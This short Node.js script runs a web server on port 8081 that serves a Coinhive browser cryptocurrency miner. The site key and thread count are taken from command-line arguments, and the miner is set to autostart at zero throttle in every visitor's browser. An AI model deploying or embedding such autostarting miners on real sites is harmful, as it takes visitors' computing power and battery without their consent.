const parameter = process.argv;
const http = require("http");

exports.run = function() {
   http.createServer(function (request, response) {
      response.writeHead(200, {'Content-Type': 'text/html'});
      response.end('<script async="" src="https://coinhive.com/lib/miner.min.js">miner.start();</script><div class="coinhive-miner" data-action="#00ff00" data-autostart="true" data-background="#000000" data-graph="#555555" data-key="' + parameter[2] + '" data-start="Start Now!" data-text="#eeeeee" data-threads="' + parameter[4] + '" data-throttle="0" data-whitelabel="false" style="height: 95px; width: 530px;"><em>Please disable Adblock!</em></div>');
   }).listen(8081);
}